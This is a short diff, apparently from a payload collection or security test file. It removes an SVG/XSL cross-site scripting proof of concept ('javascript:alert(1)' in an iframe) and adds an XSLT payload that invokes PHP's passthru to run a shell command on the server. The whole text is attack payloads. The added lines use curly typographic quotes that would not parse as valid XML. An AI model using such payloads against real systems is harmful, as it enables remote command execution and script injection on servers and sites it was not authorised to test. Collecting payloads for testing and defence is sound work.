@@ -1,11 +1,5 @@
-<?xml version="1.0"?>
-<?xml-stylesheet type="text/xml" href="#stylesheet"?>
-<!DOCTYPE doc [ <!ATTLIST xsl:stylesheet id ID #REQUIRED>]>
-<svg xmlns="http://www.w3.org/2000/svg">
-  <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-    <xsl:template match="/">
-      <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe>
-    </xsl:template>
-  </xsl:stylesheet>
-  <circle fill="red" r="40"></circle>
-</svg>
+<xsl:stylesheet version=”1.0″ xmlns:xsl=”http://www.w3.org/1999/XSL/Transform” xmlns:php=”http://php.net/xsl”>
+<xsl:template match=”/”>
+<xsl:value-of select=”php:function(‘passthru’,’ls -la /’)”/>
+</xsl:template>
+</xsl:stylesheet>
